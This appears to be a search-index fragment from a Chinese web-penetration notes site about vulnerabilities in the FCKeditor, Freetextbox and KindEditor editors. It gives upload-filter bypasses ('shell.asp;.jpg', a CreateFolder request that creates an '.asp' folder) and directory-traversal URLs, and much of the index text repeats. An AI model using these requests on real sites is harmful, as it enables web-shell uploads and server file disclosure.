1.\u67e5\u770bFCKeditor\u7248\u672c \u00b6 http://127.0.0.1/fckeditor/editor/dialog/fck_about.html http://127.0.0.1/FCKeditor/_whatsnew.html 2.\u4e00\u4e9bFCK\u9ed8\u8ba4\u94fe\u63a5(\u4ee5asp\u4e3a\u4f8b)\uff1a \u00b6 \u4e0a\u4f20\u6d4b\u8bd5\u9875\u9762\uff1aFckeditor\u7f16\u8f91\u5668\u9ed8\u8ba4\u4f1a\u5b58\u5728test.html\u548cuploadtest.html\u6587\u4ef6\uff0c\u76f4\u63a5\u8bbf\u95ee\u8fd9\u4e9b\u6587\u4ef6\u53ef\u4ee5\u83b7\u53d6\u5f53\u524d\u6587\u4ef6\u5939\u6587\u4ef6\u540d\u79f0\u4ee5\u53ca\u4e0a\u4f20\u6587\u4ef6\uff0c\u6709\u7684\u7248\u672c\u53ef\u4ee5\u76f4\u63a5\u4e0a\u4f20\u4efb\u610f\u6587\u4ef6\u7c7b\u578b\uff0c\u6d4b\u8bd5\u4e0a\u4f20\u5730\u5740\u6709\uff1a FCKeditor/editor/filemanager/browser/default/connectors/test.html FCKeditor/editor/filemanager/upload/test.html FCKeditor/editor/filemanager/connectors/test.html FCKeditor/editor/filemanager/connectors/uploadtest.html \u793a\u4f8b\u9875\u9762\uff1a FCKeditor/_samples/default.html FCKeditor/_samples/asp/sample01.asp FCKeditor/_samples/asp/sample02.asp FCKeditor/_samples/asp/sample03.asp FCKeditor/_samples/asp/sample04.asp \u8fde\u63a5\u5668\uff1a FCKeditor/editor/filemanager/connectors/asp/connector.asp FCKeditor/editor/filemanager/connectors/aspx/connector.aspx \u521b\u5efa\u6587\u4ef6\u5939\u94fe\u63a5\uff1a FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder & Type=Image & CurrentFolder=/ & NewFolderName=test \u4e0a\u4f20\u9875\u9762\uff1a Fckeditor/editor/filemanager/browser/default/browser.html?Type=file & Connector=connectors/asp/connector.Asp Fckeditor/editor/filemanager/browser/default/browser.html?Type=Image & Connector=connectors/asp/connector.asp FCKeditor/editor/filemanager/browser/default/browser.html?Type=all & Connector=connectors/asp/connector.asp FCKeditor/editor/filemanager/browser/default/browser.html?Type=/ & Connector=connectors/asp/connector.asp FCKeditor/editor/filemanager/browser/default/browser.html?Type=monyer & Connector=connectors/asp/connector.asp \u6709\u65f6\u5019\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u4f1a\u628a\u4e0a\u4f20\u9875\u9762\u7981\u6b62\u521b\u5efa\u6587\u4ef6\u5939\u548c\u4e0a\u4f20\u6587\u4ef6\uff0c\u4f46\u662f\u7531\u4e8e\u7f51\u7ad9\u7ba1\u7406\u5458\u7684\u914d\u7f6e\u4e0d\u5f53\uff0c\u6211\u4eec\u7684\u8fde\u63a5\u5668\u5199\u7edd\u5bf9\u8def\u5f84\u7684\u8bdd\uff0c\u6709\u65f6\u5019\u53ef\u4ee5\u521b\u5efa\u6587\u4ef6\u5939\u548c\u4e0a\u4f20\u6587\u4ef6 Fckeditor/editor/filemanager/browser/default/browser.html?Type=file & Connector=http://ww.xxx.com/connectors/asp/connector.Asp Fckeditor/editor/filemanager/browser/default/browser.html?Type=Image & Connector=http://ww.xxx.com/connectors/asp/connector.asp Fckeditor/editor/filemanager/browser/default/browser.html?Type=Flash & Connector=http://ww.xxx.com/connectors/asp/connector.asp 3.\u4e0a\u4f20\u7ed5\u8fc7 \u00b6 \u68c0\u6d4b\u6587\u4ef6\u540d\u4e2d\u7684\u2018.\u2019\u4fee\u6539\u4e3a\u2018_\u2019\uff0c\u7ed5\u8fc7\u65b9\u5f0f\uff1a 1.\u5728\u4e0a\u4f20\u4e86\u8bf8\u5982*shell.asp;.jpg*\u7684\u6587\u4ef6\u540e\uff0c\u4f1a\u81ea\u52a8\u5c06\u6587\u4ef6\u540d\u6539\u4e3a*shell_asp;.jpg*\u3002\u53ef\u4ee5\u7ee7\u7eed\u4e0a\u4f20\u540c\u540d\u6587\u4ef6\uff0c\u6587\u4ef6\u540d\u4f1a\u53d8\u4e3a*shell.asp;(1).jpg* 2.\u914d\u5408web\u670d\u52a1\u5668\u89e3\u6790\u6f0f\u6d1e\u7b49\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e 3.\u7a81\u7834\u5efa\u7acb\u6587\u4ef6\u5939\uff1a FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/&NewFolderName=test FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/xx.asp&NewFolderName=x.asp \u00b6 ================================================================================= FCKeditor\u7f16\u8f91\u5668 \u53ef\u4ee5\u53bb\u8fd9\u4e0b\u8f7d\u7f16\u8f91\u5668: http://download.csdn.net/detail/u011781521/9767326 1.\u67e5\u770b\u7f16\u8f91\u5668\u7248\u672c FCKeditor/_whatsnew.html 2.FCKeditor\u7f16\u8f91\u5668\u9875 FCKeditor/_samples/default.html 3.\u5e38\u7528\u4e0a\u4f20\u5730\u5740 FCKeditor/editor/filemanager/browser/default/browser.html?type=Image & connector=connectors/asp/connector.asp FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles & Type=Image & CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/browser.html?type=Image & connector=connectors/asp/connector.asp FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image & Connector=../../connectors/asp/connector.asp \u7531\u4e8e\u8fd9\u91cc\u7528\u7684\u662f2.5\u7684\u7248\u672c\u6240\u4ee5\u4e0b\u9762\u8fd9\u6761\u8bed\u53e5\u80fd\u7528 http://192.168.87.129:8234//editor/filemanager/browser/default/browser.html?Type=Image & Connector=../../connectors/asp/connector.asp \u5982\u679c\u5728\u8f93\u5165\u4ee5\u4e0a\u5730\u5740\u6d4b\u8bd5\u7684\u8fc7\u7a0b\u4e2d\u5f39\u51fa\u4ee5\u4e0b\u7684\u63d0\u793a \u90a3\u5c31\u662f\u6ca1\u6709\u5f00\u542f\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd,\u8981\u628a\\editor\\filemanager\\connectors\\asp\\config.asp\u6587\u4ef6\u4e2d\u7684 Dim ConfigIsEnabled ConfigIsEnabled = False \u8bbe\u7f6e\u6210\u529ftrue\u3002\u5c31\u884c\u4e86\uff0c\u7136\u540e\u4e0a\u4f206.asp;.jpg\u6587\u4ef6\u8bd5\u8bd5 \u53d1\u73b0\u4ed6\u8fdb\u884c\u4e86\u8fc7\u6ee46.asp;.jpg\u6539\u6210\u4e866_asp;.jpg,\u628a\u70b9\u6539\u6210\u4e86\u4e0b\u5212\u7ebf\u3002\u5ba1\u67e5\u5143\u7d20\u770b\u4e0b\u56fe\u7247\u7684\u8def\u5f84 \u8bbf\u95ee\u8fd9\u4e2a\u8def\u5f84\u770b\u4e0b\u3002 asp\u6587\u4ef6\u5e76\u6ca1\u6709\u88ab\u89e3\u6790\u6210\u529f\u3002 \u8fd9\u5c31\u662ffckeditor\u8fc7\u6ee4\".\"\u4e3a\"_\"\u7684\u4e00\u4e2a\u673a\u5236,\u60f3\u8981\u7a81\u7834\u7684\u8bdd\u6709\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\uff1a 1.\u4e8c\u6b21\u4e0a\u4f20 \u7b2c\u4e00\u6b21\u4e0a\u4f20\uff1aqq.asp;.jpg ==\u300bqq_asp;.jpg \u7b2c\u4e8c\u6b21\u4e0a\u4f20\uff1aqq.asp;.jpg ==\u300bqq_asp;.jpg (\u4e0d\u6ee1\u8db3\u547d\u540d\u8981\u6c42) \u53ef\u80fd\u51fa\u73b0\u7b2c\u4e8c\u6b21\u547d\u540d\u4e3a qq.asp;.(1).jpg \u8fd8\u662f\u88ab\u8fc7\u6ee4\u4e86\u3002\u3002 2.\u65b0\u5efa\u4e0a\u4f20 \u624b\u52a8\u65b0\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939 \u53d1\u73b0\u4ed6\u8fd8\u662f\u8fc7\u6ee4\u4e86\u3002\u90a3\u6211\u4eec\u53ea\u6709\u7a81\u7834\u5efa\u7acb\u6587\u4ef6\u5939\u4e86\u3002 \u6267\u884c\u4ee5\u4e0b\u5730\u5740\u5c31\u80fd\u6210\u529f\u521b\u5efa\u6587\u4ef6\u5939 /editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder & Type=Image & CurrentFolder=/fendo.asp & NewFolderName=x.asp \u8fd9\u53c8\u662f\u4e3a\u4ec0\u4e48\u4e86????\u624b\u52a8\u4e0d\u80fd\u521b\u5efa\uff0c\u800c\u901a\u8fc7\u4ee5\u4e0a\u5730\u5740\u5c31\u80fd\u6210\u529f\u521b\u5efa\u4e86\uff0c\u8ba9\u6211\u4eec\u6765\u5bf9\u6bd4\u4e0b\uff0c\u624b\u52a8\u521b\u5efa\u548c\u901a\u8fc7\u4ee5\u4e0a\u5730\u5740\u521b\u5efa\u7684\u4e00\u4e2a\u533a\u522b\u3002 \u6f0f\u6d1e\u5730\u5740\uff1a /editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/fendo.asp&NewFolderName=x.asp \u624b\u5de5\u65b0\u5efa\uff1a /editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/&NewFolderName=fendo.asp \u539f\u56e0\uff1a CurrentFolder\uff1a\u5f53\u524d\u6587\u4ef6\u5939 \u672a\u8fdb\u884c\u8fc7\u6ee4(\u8fd9\u4e2a\u6587\u4ef6\u5939\u4e0b\u7684\u6ca1\u6709\u8fc7\u6ee4) NewFolderName\uff1a\u65b0\u5efa\u6587\u4ef6\u540d \u8fdb\u884c\u4e86\u8fc7\u6ee4 \u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u901a\u8fc7\u4e0a\u9762\u5730\u5740\u80fd\u521b\u5efa\uff0c\u800c\u624b\u52a8\u5374\u4e0d\u80fd\u521b\u5efa\u7684\u4e00\u4e2a\u539f\u56e0\uff0c\u7136\u540e\u6211\u4eec\u518d\u4e0a\u4f206.asp;.jpg\u5230fendo.asp\u6587\u4ef6\u4e0b\u770b\u662f\u5426\u6210\u529f\u89e3\u6790\u3002 \u6210\u529f\u89e3\u6790\u3002\u3002","title":"FCKeditor\u7f16\u8f91\u5668\u6e17\u900f\u601d\u8def"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/FCKeditor/FCKeditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%9D%80/#fckeditor","text":"","title":"FCKeditor\u7f16\u8f91\u5668\u6e17\u900f\u601d\u8def"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/FCKeditor/FCKeditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%9D%80/#1fckeditor","text":"http://127.0.0.1/fckeditor/editor/dialog/fck_about.html http://127.0.0.1/FCKeditor/_whatsnew.html","title":"1.\u67e5\u770bFCKeditor\u7248\u672c"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/FCKeditor/FCKeditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%9D%80/#2fckasp","text":"\u4e0a\u4f20\u6d4b\u8bd5\u9875\u9762\uff1aFckeditor\u7f16\u8f91\u5668\u9ed8\u8ba4\u4f1a\u5b58\u5728test.html\u548cuploadtest.html\u6587\u4ef6\uff0c\u76f4\u63a5\u8bbf\u95ee\u8fd9\u4e9b\u6587\u4ef6\u53ef\u4ee5\u83b7\u53d6\u5f53\u524d\u6587\u4ef6\u5939\u6587\u4ef6\u540d\u79f0\u4ee5\u53ca\u4e0a\u4f20\u6587\u4ef6\uff0c\u6709\u7684\u7248\u672c\u53ef\u4ee5\u76f4\u63a5\u4e0a\u4f20\u4efb\u610f\u6587\u4ef6\u7c7b\u578b\uff0c\u6d4b\u8bd5\u4e0a\u4f20\u5730\u5740\u6709\uff1a FCKeditor/editor/filemanager/browser/default/connectors/test.html FCKeditor/editor/filemanager/upload/test.html FCKeditor/editor/filemanager/connectors/test.html FCKeditor/editor/filemanager/connectors/uploadtest.html \u793a\u4f8b\u9875\u9762\uff1a FCKeditor/_samples/default.html FCKeditor/_samples/asp/sample01.asp FCKeditor/_samples/asp/sample02.asp FCKeditor/_samples/asp/sample03.asp FCKeditor/_samples/asp/sample04.asp \u8fde\u63a5\u5668\uff1a FCKeditor/editor/filemanager/connectors/asp/connector.asp FCKeditor/editor/filemanager/connectors/aspx/connector.aspx \u521b\u5efa\u6587\u4ef6\u5939\u94fe\u63a5\uff1a FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder & Type=Image & CurrentFolder=/ & NewFolderName=test \u4e0a\u4f20\u9875\u9762\uff1a Fckeditor/editor/filemanager/browser/default/browser.html?Type=file & Connector=connectors/asp/connector.Asp Fckeditor/editor/filemanager/browser/default/browser.html?Type=Image & Connector=connectors/asp/connector.asp FCKeditor/editor/filemanager/browser/default/browser.html?Type=all & Connector=connectors/asp/connector.asp FCKeditor/editor/filemanager/browser/default/browser.html?Type=/ & Connector=connectors/asp/connector.asp FCKeditor/editor/filemanager/browser/default/browser.html?Type=monyer & Connector=connectors/asp/connector.asp \u6709\u65f6\u5019\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u4f1a\u628a\u4e0a\u4f20\u9875\u9762\u7981\u6b62\u521b\u5efa\u6587\u4ef6\u5939\u548c\u4e0a\u4f20\u6587\u4ef6\uff0c\u4f46\u662f\u7531\u4e8e\u7f51\u7ad9\u7ba1\u7406\u5458\u7684\u914d\u7f6e\u4e0d\u5f53\uff0c\u6211\u4eec\u7684\u8fde\u63a5\u5668\u5199\u7edd\u5bf9\u8def\u5f84\u7684\u8bdd\uff0c\u6709\u65f6\u5019\u53ef\u4ee5\u521b\u5efa\u6587\u4ef6\u5939\u548c\u4e0a\u4f20\u6587\u4ef6 Fckeditor/editor/filemanager/browser/default/browser.html?Type=file & Connector=http://ww.xxx.com/connectors/asp/connector.Asp Fckeditor/editor/filemanager/browser/default/browser.html?Type=Image & Connector=http://ww.xxx.com/connectors/asp/connector.asp Fckeditor/editor/filemanager/browser/default/browser.html?Type=Flash & Connector=http://ww.xxx.com/connectors/asp/connector.asp","title":"2.\u4e00\u4e9bFCK\u9ed8\u8ba4\u94fe\u63a5(\u4ee5asp\u4e3a\u4f8b)\uff1a"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/FCKeditor/FCKeditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%9D%80/#3","text":"\u68c0\u6d4b\u6587\u4ef6\u540d\u4e2d\u7684\u2018.\u2019\u4fee\u6539\u4e3a\u2018_\u2019\uff0c\u7ed5\u8fc7\u65b9\u5f0f\uff1a 1.\u5728\u4e0a\u4f20\u4e86\u8bf8\u5982*shell.asp;.jpg*\u7684\u6587\u4ef6\u540e\uff0c\u4f1a\u81ea\u52a8\u5c06\u6587\u4ef6\u540d\u6539\u4e3a*shell_asp;.jpg*\u3002\u53ef\u4ee5\u7ee7\u7eed\u4e0a\u4f20\u540c\u540d\u6587\u4ef6\uff0c\u6587\u4ef6\u540d\u4f1a\u53d8\u4e3a*shell.asp;(1).jpg* 2.\u914d\u5408web\u670d\u52a1\u5668\u89e3\u6790\u6f0f\u6d1e\u7b49\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e 3.\u7a81\u7834\u5efa\u7acb\u6587\u4ef6\u5939\uff1a FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/&NewFolderName=test FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/xx.asp&NewFolderName=x.asp","title":"3.\u4e0a\u4f20\u7ed5\u8fc7"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/FCKeditor/FCKeditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%9D%80/#_1","text":"================================================================================= FCKeditor\u7f16\u8f91\u5668 \u53ef\u4ee5\u53bb\u8fd9\u4e0b\u8f7d\u7f16\u8f91\u5668: http://download.csdn.net/detail/u011781521/9767326 1.\u67e5\u770b\u7f16\u8f91\u5668\u7248\u672c FCKeditor/_whatsnew.html 2.FCKeditor\u7f16\u8f91\u5668\u9875 FCKeditor/_samples/default.html 3.\u5e38\u7528\u4e0a\u4f20\u5730\u5740 FCKeditor/editor/filemanager/browser/default/browser.html?type=Image & connector=connectors/asp/connector.asp FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles & Type=Image & CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/browser.html?type=Image & connector=connectors/asp/connector.asp FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image & Connector=../../connectors/asp/connector.asp \u7531\u4e8e\u8fd9\u91cc\u7528\u7684\u662f2.5\u7684\u7248\u672c\u6240\u4ee5\u4e0b\u9762\u8fd9\u6761\u8bed\u53e5\u80fd\u7528 http://192.168.87.129:8234//editor/filemanager/browser/default/browser.html?Type=Image & Connector=../../connectors/asp/connector.asp \u5982\u679c\u5728\u8f93\u5165\u4ee5\u4e0a\u5730\u5740\u6d4b\u8bd5\u7684\u8fc7\u7a0b\u4e2d\u5f39\u51fa\u4ee5\u4e0b\u7684\u63d0\u793a \u90a3\u5c31\u662f\u6ca1\u6709\u5f00\u542f\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd,\u8981\u628a\\editor\\filemanager\\connectors\\asp\\config.asp\u6587\u4ef6\u4e2d\u7684 Dim ConfigIsEnabled ConfigIsEnabled = False \u8bbe\u7f6e\u6210\u529ftrue\u3002\u5c31\u884c\u4e86\uff0c\u7136\u540e\u4e0a\u4f206.asp;.jpg\u6587\u4ef6\u8bd5\u8bd5 \u53d1\u73b0\u4ed6\u8fdb\u884c\u4e86\u8fc7\u6ee46.asp;.jpg\u6539\u6210\u4e866_asp;.jpg,\u628a\u70b9\u6539\u6210\u4e86\u4e0b\u5212\u7ebf\u3002\u5ba1\u67e5\u5143\u7d20\u770b\u4e0b\u56fe\u7247\u7684\u8def\u5f84 \u8bbf\u95ee\u8fd9\u4e2a\u8def\u5f84\u770b\u4e0b\u3002 asp\u6587\u4ef6\u5e76\u6ca1\u6709\u88ab\u89e3\u6790\u6210\u529f\u3002 \u8fd9\u5c31\u662ffckeditor\u8fc7\u6ee4\".\"\u4e3a\"_\"\u7684\u4e00\u4e2a\u673a\u5236,\u60f3\u8981\u7a81\u7834\u7684\u8bdd\u6709\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\uff1a 1.\u4e8c\u6b21\u4e0a\u4f20 \u7b2c\u4e00\u6b21\u4e0a\u4f20\uff1aqq.asp;.jpg ==\u300bqq_asp;.jpg \u7b2c\u4e8c\u6b21\u4e0a\u4f20\uff1aqq.asp;.jpg ==\u300bqq_asp;.jpg (\u4e0d\u6ee1\u8db3\u547d\u540d\u8981\u6c42) \u53ef\u80fd\u51fa\u73b0\u7b2c\u4e8c\u6b21\u547d\u540d\u4e3a qq.asp;.(1).jpg \u8fd8\u662f\u88ab\u8fc7\u6ee4\u4e86\u3002\u3002 2.\u65b0\u5efa\u4e0a\u4f20 \u624b\u52a8\u65b0\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939 \u53d1\u73b0\u4ed6\u8fd8\u662f\u8fc7\u6ee4\u4e86\u3002\u90a3\u6211\u4eec\u53ea\u6709\u7a81\u7834\u5efa\u7acb\u6587\u4ef6\u5939\u4e86\u3002 \u6267\u884c\u4ee5\u4e0b\u5730\u5740\u5c31\u80fd\u6210\u529f\u521b\u5efa\u6587\u4ef6\u5939 /editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder & Type=Image & CurrentFolder=/fendo.asp & NewFolderName=x.asp \u8fd9\u53c8\u662f\u4e3a\u4ec0\u4e48\u4e86????\u624b\u52a8\u4e0d\u80fd\u521b\u5efa\uff0c\u800c\u901a\u8fc7\u4ee5\u4e0a\u5730\u5740\u5c31\u80fd\u6210\u529f\u521b\u5efa\u4e86\uff0c\u8ba9\u6211\u4eec\u6765\u5bf9\u6bd4\u4e0b\uff0c\u624b\u52a8\u521b\u5efa\u548c\u901a\u8fc7\u4ee5\u4e0a\u5730\u5740\u521b\u5efa\u7684\u4e00\u4e2a\u533a\u522b\u3002 \u6f0f\u6d1e\u5730\u5740\uff1a /editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/fendo.asp&NewFolderName=x.asp \u624b\u5de5\u65b0\u5efa\uff1a /editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/&NewFolderName=fendo.asp \u539f\u56e0\uff1a CurrentFolder\uff1a\u5f53\u524d\u6587\u4ef6\u5939 \u672a\u8fdb\u884c\u8fc7\u6ee4(\u8fd9\u4e2a\u6587\u4ef6\u5939\u4e0b\u7684\u6ca1\u6709\u8fc7\u6ee4) NewFolderName\uff1a\u65b0\u5efa\u6587\u4ef6\u540d \u8fdb\u884c\u4e86\u8fc7\u6ee4 \u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u901a\u8fc7\u4e0a\u9762\u5730\u5740\u80fd\u521b\u5efa\uff0c\u800c\u624b\u52a8\u5374\u4e0d\u80fd\u521b\u5efa\u7684\u4e00\u4e2a\u539f\u56e0\uff0c\u7136\u540e\u6211\u4eec\u518d\u4e0a\u4f206.asp;.jpg\u5230fendo.asp\u6587\u4ef6\u4e0b\u770b\u662f\u5426\u6210\u529f\u89e3\u6790\u3002 \u6210\u529f\u89e3\u6790\u3002\u3002","title":""},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Freetextbox%20editor/Freetextbox%20Asp.net%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/","text":"Freetextbox \u00b6 Freetextbox\u904d\u5386\u76ee\u5f55\u6f0f\u6d1e \u00b6 \u5f71\u54cd\u7248\u672c\uff1a\u672a\u77e5 \u8106\u5f31\u63cf\u8ff0\uff1a \u56e0\u4e3aftb.imagegallery.aspx\u4ee3\u7801\u4e2d \u53ea\u8fc7\u6ee4\u4e86/\u4f46\u662f\u6ca1\u6709\u8fc7\u6ee4\\\u7b26\u53f7\u6240\u4ee5\u5bfc\u81f4\u51fa\u73b0\u4e86\u904d\u5386\u76ee\u5f55\u7684\u95ee\u9898\u3002 \u653b\u51fb\u5229\u7528: \u5728\u7f16\u8f91\u5668\u9875\u9762\u70b9\u56fe\u7247\u4f1a\u5f39\u51fa\u4e00\u4e2a\u6846\uff08\u6293\u5305\u5f97\u5230\u6b64\u5730\u5740\uff09\u6784\u9020\u5982\u4e0b\uff0c\u53ef\u904d\u5386\u76ee\u5f55\u3002 http://navisec.it/Member/images/ftb/HelperScripts/ftb.imagegallery.aspx?frame=1&rif=..&cif= ..","title":"Freetextbox Asp.net\u89e3\u6790\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Freetextbox%20editor/Freetextbox%20Asp.net%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#freetextbox","text":"","title":"Freetextbox"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Freetextbox%20editor/Freetextbox%20Asp.net%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#freetextbox_1","text":"\u5f71\u54cd\u7248\u672c\uff1a\u672a\u77e5 \u8106\u5f31\u63cf\u8ff0\uff1a \u56e0\u4e3aftb.imagegallery.aspx\u4ee3\u7801\u4e2d \u53ea\u8fc7\u6ee4\u4e86/\u4f46\u662f\u6ca1\u6709\u8fc7\u6ee4\\\u7b26\u53f7\u6240\u4ee5\u5bfc\u81f4\u51fa\u73b0\u4e86\u904d\u5386\u76ee\u5f55\u7684\u95ee\u9898\u3002 \u653b\u51fb\u5229\u7528: \u5728\u7f16\u8f91\u5668\u9875\u9762\u70b9\u56fe\u7247\u4f1a\u5f39\u51fa\u4e00\u4e2a\u6846\uff08\u6293\u5305\u5f97\u5230\u6b64\u5730\u5740\uff09\u6784\u9020\u5982\u4e0b\uff0c\u53ef\u904d\u5386\u76ee\u5f55\u3002 http://navisec.it/Member/images/ftb/HelperScripts/ftb.imagegallery.aspx?frame=1&rif=..&cif= ..","title":"Freetextbox\u904d\u5386\u76ee\u5f55\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Freetextbox%20editor/Freetextbox%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/","text":"Freetextbox \u00b6 Freetextbox\u904d\u5386\u76ee\u5f55\u6f0f\u6d1e \u00b6 \u5f71\u54cd\u7248\u672c\uff1a\u672a\u77e5 \u8106\u5f31\u63cf\u8ff0\uff1a \u56e0\u4e3aftb.imagegallery.aspx\u4ee3\u7801\u4e2d \u53ea\u8fc7\u6ee4\u4e86/\u4f46\u662f\u6ca1\u6709\u8fc7\u6ee4\\\u7b26\u53f7\u6240\u4ee5\u5bfc\u81f4\u51fa\u73b0\u4e86\u904d\u5386\u76ee\u5f55\u7684\u95ee\u9898\u3002 \u653b\u51fb\u5229\u7528: \u5728\u7f16\u8f91\u5668\u9875\u9762\u70b9\u56fe\u7247\u4f1a\u5f39\u51fa\u4e00\u4e2a\u6846\uff08\u6293\u5305\u5f97\u5230\u6b64\u5730\u5740\uff09\u6784\u9020\u5982\u4e0b\uff0c\u53ef\u904d\u5386\u76ee\u5f55\u3002 http://127.0.0.1/Member/images/ftb/HelperScripts/ftb.imagegallery.aspx?frame=1&rif=..&cif= ..","title":"Freetextbox\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Freetextbox%20editor/Freetextbox%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#freetextbox","text":"","title":"Freetextbox"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Freetextbox%20editor/Freetextbox%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#freetextbox_1","text":"\u5f71\u54cd\u7248\u672c\uff1a\u672a\u77e5 \u8106\u5f31\u63cf\u8ff0\uff1a \u56e0\u4e3aftb.imagegallery.aspx\u4ee3\u7801\u4e2d \u53ea\u8fc7\u6ee4\u4e86/\u4f46\u662f\u6ca1\u6709\u8fc7\u6ee4\\\u7b26\u53f7\u6240\u4ee5\u5bfc\u81f4\u51fa\u73b0\u4e86\u904d\u5386\u76ee\u5f55\u7684\u95ee\u9898\u3002 \u653b\u51fb\u5229\u7528: \u5728\u7f16\u8f91\u5668\u9875\u9762\u70b9\u56fe\u7247\u4f1a\u5f39\u51fa\u4e00\u4e2a\u6846\uff08\u6293\u5305\u5f97\u5230\u6b64\u5730\u5740\uff09\u6784\u9020\u5982\u4e0b\uff0c\u53ef\u904d\u5386\u76ee\u5f55\u3002 http://127.0.0.1/Member/images/ftb/HelperScripts/ftb.imagegallery.aspx?frame=1&rif=..&cif= ..","title":"Freetextbox\u904d\u5386\u76ee\u5f55\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/KindEditor%203.4.2%263.5.5%E5%88%97%E7%9B%AE%E5%BD%95%E6%BC%8F%E6%B4%9E/","text":"**KindEditor\u5217\u76ee\u5f55\u6f0f\u6d1e ** \u6d4b\u8bd5\u7248\u672c\uff1aKindEditor 3.4.2 KindEditor 3.5.5 1.1. http://127.0.0.1/67cms/kindeditor/php/file_manager_json.php?path=/ \\2. //path=/\uff0c\u7206\u51fa\u7edd\u5bf9\u8def\u5f84D:AppServwww67cmskindeditorphpfile_manager_json.php \\3. 2. http://127.0.0.1/67cms/kindeditor/php/file_manager_json.php?path=AppServ/www/67cms/ \\4. //\u6839\u636e\u7206\u51fa\u7684\u7edd\u5bf9\u8def\u5f84\uff0c\u4fee\u6539path\u7684\u503c\u4e3aAppServ/www/67cms/ \\5. \u8fd9\u65f6\u5c06\u904d\u5386d:/AppServ/www/67cms/\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u548c\u6587\u4ef6\u540d","title":"KindEditor 3.4.2&3.5.5\u5217\u76ee\u5f55\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/kindeditor%203.2.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","text":"Kindeditor \u00b6 \u5229\u7528WIN 2003 IIS\u6587\u4ef6\u540d\u79f0\u89e3\u6790\u6f0f\u6d1e\u83b7\u5f97SHELL \u00b6 \u5f71\u54cd\u7248\u672c: <= kindeditor 3.2.1(09\u5e748\u6708\u4efd\u53d1\u5e03\u7684\u6700\u65b0\u7248) \u8106\u5f31\u63cf\u8ff0/\u653b\u51fb\u5229\u7528\uff1a test.asp;.jpg","title":"Kindeditor 